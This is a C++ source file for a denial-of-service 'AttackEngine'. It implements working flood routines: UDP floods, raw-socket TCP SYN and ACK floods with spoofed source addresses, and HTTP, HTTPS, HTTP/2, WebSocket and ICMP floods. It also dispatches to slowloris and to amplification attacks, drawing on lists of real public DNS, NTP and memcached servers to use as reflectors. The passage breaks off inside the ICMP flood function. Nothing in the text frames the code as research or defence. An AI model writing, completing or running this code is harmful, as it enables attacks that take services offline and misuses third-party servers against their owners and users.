#include "AttackEngine.h"
#include "Utilities.h"
#include <iostream>
#include <fstream>
#include <random>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <curl/curl.h>
#include <algorithm>
#include <sstream>
#include <csignal>

using namespace std;

static const vector<string> DNS_SERVERS = {
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "149.112.112.112", "208.67.222.222", "208.67.220.220"
};

static const vector<string> NTP_SERVERS = {
    "129.6.15.28", "132.163.4.103", "193.79.237.14",
    "195.134.67.161", "198.46.130.70", "199.212.0.46"
};

static const vector<string> MEMCACHED_SERVERS = {
    "111.13.13.131", "211.5.177.25", "103.56.238.116",
    "206.188.192.12", "139.162.167.71", "192.241.100.100"
};

static const vector<string> SSDP_SERVERS = {
    "239.255.255.250"
};

static const vector<string> SNMP_SERVERS = {
    "192.168.1.1", "192.168.0.1", "10.0.0.1",
    "172.16.0.1", "8.8.8.8"
};

static const vector<string> MDNS_SERVERS = {
    "224.0.0.251"
};

static const vector<string> CLDAP_SERVERS = {
    "8.8.8.8", "1.1.1.1", "9.9.9.9"
};

static const vector<string> CHARGEN_SERVERS = {
    "8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"
};

static const vector<string> QOTD_SERVERS = {
    "8.8.8.8", "1.1.1.1", "9.9.9.9"
};

static const vector<string> RDP_SERVERS = {
    "8.8.8.8", "1.1.1.1", "9.9.9.9"
};

static const vector<string> COAP_SERVERS = {
    "224.0.1.187", "ff02::fd"
};

static const vector<string> DEFAULT_USER_AGENTS = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
};

AttackEngine::AttackEngine()
    : attack_running(false), packets_sent(0), bytes_sent(0),
      packet_limit(10000), data_limit(0) {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    curl_global_init(CURL_GLOBAL_ALL);
    user_agents = DEFAULT_USER_AGENTS;
    subdomains = {
        "www", "mail", "ftp", "blog", "shop", "api", "cdn", "static",
        "download", "forum", "support", "help", "admin", "test", "dev"
    };
    http2_settings = {
        "SETTINGS_HEADER_TABLE_SIZE=4096",
        "SETTINGS_ENABLE_PUSH=1",
        "SETTINGS_MAX_CONCURRENT_STREAMS=100",
        "SETTINGS_INITIAL_WINDOW_SIZE=6291456",
        "SETTINGS_MAX_FRAME_SIZE=16384",
        "SETTINGS_MAX_HEADER_LIST_SIZE=262144"
    };
}

AttackEngine::~AttackEngine() {
    stop_attack();
    curl_global_cleanup();
    EVP_cleanup();
}

bool AttackEngine::load_user_agents(const string& filename) {
    ifstream file(filename);
    if (!file.is_open()) return false;
    string line;
    while (getline(file, line)) {
        if (!line.empty()) {
            while (!line.empty() && (line.back() == '\r' || line.back() == '\n'))
                line.pop_back();
            if (!line.empty())
                user_agents.push_back(line);
        }
    }
    file.close();
    return true;
}

bool AttackEngine::load_subdomains(const string& filename) {
    ifstream file(filename);
    if (!file.is_open()) return false;
    string line;
    while (getline(file, line)) {
        if (!line.empty()) {
            while (!line.empty() && (line.back() == '\r' || line.back() == '\n'))
                line.pop_back();
            if (!line.empty())
                subdomains.push_back(line);
        }
    }
    file.close();
    return true;
}

string AttackEngine::get_random_user_agent() {
    if (user_agents.empty()) return DEFAULT_USER_AGENTS[0];
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, user_agents.size() - 1);
    return user_agents[dis(gen)];
}

string AttackEngine::get_random_subdomain() {
    if (subdomains.empty()) return "www";
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, subdomains.size() - 1);
    return subdomains[dis(gen)];
}

string AttackEngine::get_random_http2_setting() {
    if (http2_settings.empty()) return "SETTINGS_HEADER_TABLE_SIZE=4096";
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, http2_settings.size() - 1);
    return http2_settings[dis(gen)];
}

string AttackEngine::generate_ja3_fingerprint() {
    random_device rd;
    mt19937 gen(rd());
    string fp;
    fp.reserve(64);
    static const char hex[] = "0123456789abcdef";
    uniform_int_distribution<> dis(0, 15);
    for (int i = 0; i < 64; i++)
        fp += hex[dis(gen)];
    return fp;
}

bool AttackEngine::resolve_target(const string& target, int port, struct sockaddr_in& addr4,
                                  struct sockaddr_in6& addr6, IPVersion ip_version) {
    memset(&addr4, 0, sizeof(addr4));
    memset(&addr6, 0, sizeof(addr6));
    bool resolved = false;

    if (ip_version == IPVersion::IPv4 || ip_version == IPVersion::Both) {
        if (inet_pton(AF_INET, target.c_str(), &addr4.sin_addr) == 1) {
            addr4.sin_family = AF_INET;
            addr4.sin_port = htons(port);
            resolved = true;
        } else {
            struct addrinfo hints, *result;
            memset(&hints, 0, sizeof(hints));
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(target.c_str(), nullptr, &hints, &result) == 0 && result) {
                memcpy(&addr4, result->ai_addr, result->ai_addrlen);
                addr4.sin_port = htons(port);
                freeaddrinfo(result);
                resolved = true;
            }
        }
    }

    if (ip_version == IPVersion::IPv6 || ip_version == IPVersion::Both) {
        if (inet_pton(AF_INET6, target.c_str(), &addr6.sin6_addr) == 1) {
            addr6.sin6_family = AF_INET6;
            addr6.sin6_port = htons(port);
            resolved = true;
        } else {
            struct addrinfo hints, *result;
            memset(&hints, 0, sizeof(hints));
            hints.ai_family = AF_INET6;
            hints.ai_socktype = SOCK_STREAM;
            if (getaddrinfo(target.c_str(), nullptr, &hints, &result) == 0 && result) {
                memcpy(&addr6, result->ai_addr, result->ai_addrlen);
                addr6.sin6_port = htons(port);
                freeaddrinfo(result);
                resolved = true;
            }
        }
    }

    return resolved;
}

bool AttackEngine::resolve_target(const string& target, int port, struct sockaddr_in& addr) {
    memset(&addr, 0, sizeof(addr));
    if (inet_pton(AF_INET, target.c_str(), &addr.sin_addr) == 1) {
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        return true;
    }
    struct addrinfo hints, *result;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(target.c_str(), nullptr, &hints, &result) == 0 && result) {
        memcpy(&addr, result->ai_addr, result->ai_addrlen);
        addr.sin_port = htons(port);
        freeaddrinfo(result);
        return true;
    }
    return false;
}

void AttackEngine::stop_attack() {
    attack_running = false;
    for (auto& t : attack_threads) {
        if (t.joinable()) t.join();
    }
    attack_threads.clear();
}

void AttackEngine::start_attack(const AttackConfig& config) {
    start_attack(config.target, config.port, config.method,
                 config.threads, config.rate, config.packet_size,
                 config.random_source, config.random_port,
                 config.proxy_manager, config.packet_limit, config.data_limit);
}

void AttackEngine::start_attack(const string& target, int port, const string& method,
                                int threads, int rate, int packet_size,
                                bool random_source, bool random_port,
                                ProxyManager* proxy_manager,
                                long long pkt_limit, long long dat_limit) {
    stop_attack();

    packets_sent = 0;
    bytes_sent = 0;
    error_count = 0;
    retry_count = 0;
    packet_limit = pkt_limit;
    data_limit = dat_limit;
    peak_bps = 0;
    start_time = chrono::steady_clock::now();
    attack_running = true;

    if (method == "udp") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::udp_flood, this,
                                        target, port, rate / threads, packet_size,
                                        random_source, random_port, proxy_manager, IPVersion::IPv4);
    } else if (method == "tcp" || method == "syn") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::tcp_syn_flood, this,
                                        target, port, rate / threads,
                                        random_source, proxy_manager, IPVersion::IPv4);
    } else if (method == "ack") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::tcp_ack_flood, this,
                                        target, port, rate / threads,
                                        random_source, proxy_manager, IPVersion::IPv4);
    } else if (method == "tcpconn") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::tcp_connect_flood, this,
                                        target, port, proxy_manager, IPVersion::IPv4);
    } else if (method == "http" || method == "httpget") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::http_flood, this,
                                        target, port, rate / threads,
                                        proxy_manager, IPVersion::IPv4);
    } else if (method == "httppost" || method == "post") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::http_post_flood, this,
                                        target, port, rate / threads,
                                        proxy_manager, IPVersion::IPv4);
    } else if (method == "https") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::https_flood, this,
                                        target, port, proxy_manager, IPVersion::IPv4);
    } else if (method == "http2") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::http2_flood, this,
                                        target, port, rate / threads,
                                        proxy_manager, IPVersion::IPv4);
    } else if (method == "ws") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::websocket_flood, this,
                                        target, port, rate / threads,
                                        proxy_manager, IPVersion::IPv4);
    } else if (method == "icmp") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::icmp_flood, this,
                                        target, rate / threads, packet_size, IPVersion::IPv4);
    } else if (method == "slowloris") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::slowloris_attack, this,
                                        target, port, threads, proxy_manager, IPVersion::IPv4);
    } else if (method == "dns") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::dns_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    } else if (method == "ntp") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::ntp_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    } else if (method == "mem") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::memcached_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    } else if (method == "ssdp") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::ssdp_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    } else if (method == "snmp") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::snmp_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    } else if (method == "mdns") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::mdns_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    } else if (method == "cldap") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::cldap_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    } else if (method == "chargen") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::chargen_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    } else if (method == "qotd") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::qotd_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    } else if (method == "rdp") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::rdp_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    } else if (method == "coap") {
        for (int i = 0; i < threads; i++)
            attack_threads.emplace_back(&AttackEngine::coap_amplification, this,
                                        target, port, rate / threads, IPVersion::IPv4);
    }
}

void AttackEngine::udp_flood(const string& target, int port, int rate, int packet_size,
                             bool random_source, bool random_port, ProxyManager* proxy_manager,
                             IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    vector<uint8_t> payload(packet_size);
    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        if (random_source || random_port) {
            close(sock);
            sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock < 0) break;
            if (random_port) {
                uint16_t sport = 1024 + (gen() % 64511);
                struct sockaddr_in local;
                memset(&local, 0, sizeof(local));
                local.sin_family = AF_INET;
                local.sin_port = htons(sport);
                local.sin_addr.s_addr = INADDR_ANY;
                bind(sock, (struct sockaddr*)&local, sizeof(local));
            }
        }

        for (auto& b : payload) b = gen() % 256;

        string proxy_ip;
        uint16_t proxy_port = 0;
        if (proxy_manager) {
            auto p = proxy_manager->get_random_proxy();
            proxy_ip = p.first;
            proxy_port = p.second;
        }

        ssize_t sent = sendto(sock, payload.data(), payload.size(), 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }

        if (rate > 0) {
            usleep(1000000 / rate);
        }
    }
    close(sock);
}

void AttackEngine::tcp_syn_flood(const string& target, int port, int rate,
                                 bool random_source, ProxyManager* proxy_manager,
                                 IPVersion ip_version) {
    (void)ip_version;
    (void)proxy_manager;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint8_t packet[60];
        memset(packet, 0, sizeof(packet));

        struct iphdr* ip = (struct iphdr*)packet;
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = htons(40);
        ip->id = htons(gen() % 65535);
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        if (random_source) {
            ip->saddr = gen();
        } else {
            ip->saddr = INADDR_ANY;
        }
        ip->daddr = dest.sin_addr.s_addr;

        struct tcphdr* tcp = (struct tcphdr*)(packet + 20);
        tcp->source = htons(random_source ? (1024 + gen() % 64511) : (1024 + gen() % 64511));
        tcp->dest = htons(port);
        tcp->seq = gen();
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(65535);

        ssize_t sent = sendto(sock, packet, 40, 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }

        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::tcp_ack_flood(const string& target, int port, int rate,
                                 bool random_source, ProxyManager* proxy_manager,
                                 IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        uint8_t packet[60];
        memset(packet, 0, sizeof(packet));

        struct iphdr* ip = (struct iphdr*)packet;
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = htons(40);
        ip->id = htons(gen() % 65535);
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = random_source ? gen() : INADDR_ANY;
        ip->daddr = dest.sin_addr.s_addr;

        struct tcphdr* tcp = (struct tcphdr*)(packet + 20);
        tcp->source = htons(1024 + gen() % 64511);
        tcp->dest = htons(port);
        tcp->seq = gen();
        tcp->ack_seq = gen();
        tcp->doff = 5;
        tcp->ack = 1;
        tcp->window = htons(65535);

        ssize_t sent = sendto(sock, packet, 40, 0,
                              (struct sockaddr*)&dest, sizeof(dest));
        if (sent > 0) {
            packets_sent++;
            bytes_sent += sent;
        } else {
            error_count++;
        }

        if (rate > 0) usleep(1000000 / rate);
    }
    close(sock);
}

void AttackEngine::tcp_connect_flood(const string& target, int port,
                                     ProxyManager* proxy_manager, IPVersion ip_version) {
    (void)ip_version;
    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { error_count++; continue; }

        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(port);
        inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

        struct timeval tv;
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            string payload = "GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: " + get_random_user_agent() + "\r\nConnection: keep-alive\r\n\r\n";
            ssize_t sent = send(sock, payload.data(), payload.size(), 0);
            if (sent > 0) {
                packets_sent++;
                bytes_sent += sent;
            }
            char buf[1024];
            recv(sock, buf, sizeof(buf), MSG_DONTWAIT);
        } else {
            error_count++;
        }
        close(sock);
        usleep(1000);
    }
}

void AttackEngine::http_flood(const string& target, int port, int rate,
                              ProxyManager* proxy_manager, IPVersion ip_version) {
    (void)ip_version;
    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { error_count++; continue; }

        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(port);
        inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            string ua = get_random_user_agent();
            string path = "/" + get_random_subdomain() + "/" + to_string(gen() % 100000);
            string req = "GET " + path + " HTTP/1.1\r\n"
                         "Host: " + target + "\r\n"
                         "User-Agent: " + ua + "\r\n"
                         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                         "Accept-Language: en-US,en;q=0.5\r\n"
                         "Accept-Encoding: gzip, deflate\r\n"
                         "Connection: keep-alive\r\n"
                         "Cache-Control: no-cache\r\n"
                         "\r\n";
            ssize_t sent = send(sock, req.data(), req.size(), 0);
            if (sent > 0) {
                packets_sent++;
                bytes_sent += sent;
            } else {
                error_count++;
            }
            char buf[4096];
            recv(sock, buf, sizeof(buf), MSG_DONTWAIT);
        } else {
            error_count++;
        }
        close(sock);
        if (rate > 0) usleep(1000000 / rate);
    }
}

void AttackEngine::http_post_flood(const string& target, int port, int rate,
                                   ProxyManager* proxy_manager, IPVersion ip_version) {
    (void)ip_version;
    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { error_count++; continue; }

        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(port);
        inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            string ua = get_random_user_agent();
            string body = Utilities::random_string(1024 + gen() % 4096);
            string req = "POST / HTTP/1.1\r\n"
                         "Host: " + target + "\r\n"
                         "User-Agent: " + ua + "\r\n"
                         "Content-Type: application/x-www-form-urlencoded\r\n"
                         "Content-Length: " + to_string(body.size()) + "\r\n"
                         "Accept: */*\r\n"
                         "Connection: keep-alive\r\n"
                         "\r\n" + body;
            ssize_t sent = send(sock, req.data(), req.size(), 0);
            if (sent > 0) {
                packets_sent++;
                bytes_sent += sent;
            } else {
                error_count++;
            }
            char buf[4096];
            recv(sock, buf, sizeof(buf), MSG_DONTWAIT);
        } else {
            error_count++;
        }
        close(sock);
        if (rate > 0) usleep(1000000 / rate);
    }
}

void AttackEngine::https_flood(const string& target, int port,
                               ProxyManager* proxy_manager, IPVersion ip_version) {
    (void)ip_version;
    (void)proxy_manager;
    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { error_count++; continue; }

        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(port);
        inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
            if (ctx) {
                SSL* ssl = SSL_new(ctx);
                SSL_set_fd(ssl, sock);
                SSL_set_tlsext_host_name(ssl, target.c_str());
                if (SSL_connect(ssl) == 1) {
                    string ua = get_random_user_agent();
                    string req = "GET / HTTP/1.1\r\nHost: " + target + "\r\n"
                                 "User-Agent: " + ua + "\r\n"
                                 "Accept: */*\r\n"
                                 "Connection: keep-alive\r\n\r\n";
                    int sent = SSL_write(ssl, req.data(), req.size());
                    if (sent > 0) {
                        packets_sent++;
                        bytes_sent += sent;
                    } else {
                        error_count++;
                    }
                    char buf[4096];
                    SSL_read(ssl, buf, sizeof(buf));
                    SSL_shutdown(ssl);
                }
                SSL_free(ssl);
                SSL_CTX_free(ctx);
            }
        } else {
            error_count++;
        }
        close(sock);
        usleep(1000);
    }
}

void AttackEngine::http2_flood(const string& target, int port, int rate,
                               ProxyManager* proxy_manager, IPVersion ip_version) {
    (void)ip_version;
    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { error_count++; continue; }

        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(port);
        inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
            if (ctx) {
                SSL* ssl = SSL_new(ctx);
                SSL_set_fd(ssl, sock);
                SSL_set_tlsext_host_name(ssl, target.c_str());
                if (SSL_connect(ssl) == 1) {
                    string settings = get_random_http2_setting();
                    string req = "GET / HTTP/2\r\nHost: " + target + "\r\n"
                                 "User-Agent: " + get_random_user_agent() + "\r\n"
                                 "Accept: text/html\r\n"
                                 "Accept-Encoding: gzip\r\n"
                                 "X-HTTP2-Settings: " + settings + "\r\n"
                                 "Connection: Upgrade, HTTP2-Settings\r\n"
                                 "Upgrade: h2c\r\n\r\n";
                    int sent = SSL_write(ssl, req.data(), req.size());
                    if (sent > 0) {
                        packets_sent++;
                        bytes_sent += sent;
                    } else {
                        error_count++;
                    }
                    char buf[4096];
                    SSL_read(ssl, buf, sizeof(buf));
                    SSL_shutdown(ssl);
                }
                SSL_free(ssl);
                SSL_CTX_free(ctx);
            }
        } else {
            error_count++;
        }
        close(sock);
        if (rate > 0) usleep(1000000 / rate);
    }
}

void AttackEngine::websocket_flood(const string& target, int port, int rate,
                                   ProxyManager* proxy_manager, IPVersion ip_version) {
    (void)ip_version;
    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { error_count++; continue; }

        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons(port);
        inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(sock, (struct sockaddr*)&dest, sizeof(dest)) == 0) {
            string key = Utilities::base64_encode(Utilities::random_string(16));
            string req = "GET / HTTP/1.1\r\n"
                         "Host: " + target + "\r\n"
                         "Upgrade: websocket\r\n"
                         "Connection: Upgrade\r\n"
                         "Sec-WebSocket-Key: " + key + "\r\n"
                         "Sec-WebSocket-Version: 13\r\n"
                         "User-Agent: " + get_random_user_agent() + "\r\n\r\n";
            ssize_t sent = send(sock, req.data(), req.size(), 0);
            if (sent > 0) {
                packets_sent++;
                bytes_sent += sent;
                char buf[4096];
                ssize_t n = recv(sock, buf, sizeof(buf), 0);
                if (n > 0) {
                    string payload = Utilities::random_string(256 + gen() % 1024);
                    uint8_t frame[10];
                    frame[0] = 0x81;
                    if (payload.size() < 126) {
                        frame[1] = payload.size();
                        sent = send(sock, frame, 2, 0);
                    } else if (payload.size() < 65536) {
                        frame[1] = 126;
                        frame[2] = (payload.size() >> 8) & 0xff;
                        frame[3] = payload.size() & 0xff;
                        sent = send(sock, frame, 4, 0);
                    } else {
                        frame[1] = 127;
                        uint64_t sz = payload.size();
                        for (int i = 7; i >= 0; i--) frame[9 - i] = (sz >> (i * 8)) & 0xff;
                        sent = send(sock, frame, 10, 0);
                    }
                    sent = send(sock, payload.data(), payload.size(), 0);
                    if (sent > 0) {
                        packets_sent++;
                        bytes_sent += sent;
                    }
                }
            }
        } else {
            error_count++;
        }
        close(sock);
        if (rate > 0) usleep(1000000 / rate);
    }
}

void AttackEngine::icmp_flood(const string& target, int rate, int packet_size,
                              IPVersion ip_version) {
    (void)ip_version;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return;

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, target.c_str(), &dest.sin_addr);

    random_device rd;
    mt19937 gen(rd());

    while (attack_running) {
        if (packet_limit > 0 && packets_sent.load() >= packet_limit.load()) break;
        if (data_limit > 0 && bytes_sent.load() >= data_limit.load()) break;

        vector<uint8_t> packet(sizeof(struct icmphdr) + packet_size);
        struct icmphdr* icmp = (struct icmphdr*)packet.data();
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->un.echo.id = htons(gen() % 65535);
        icmp->un.echo.sequence = htons(gen() % 65535);

        for (size_t i = sizeof(struct icmphdr); i < packet.size(); i++)
            packet[i] = gen() % 256;

        uint32_t sum = 0;
        uint16_t* ptr = (uint16_t*)packet.data();
        for (size_t i = 0; i < packet.size() / 2; i++) sum += ptr[i];
        while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
        icmp->checksum = ~sum;

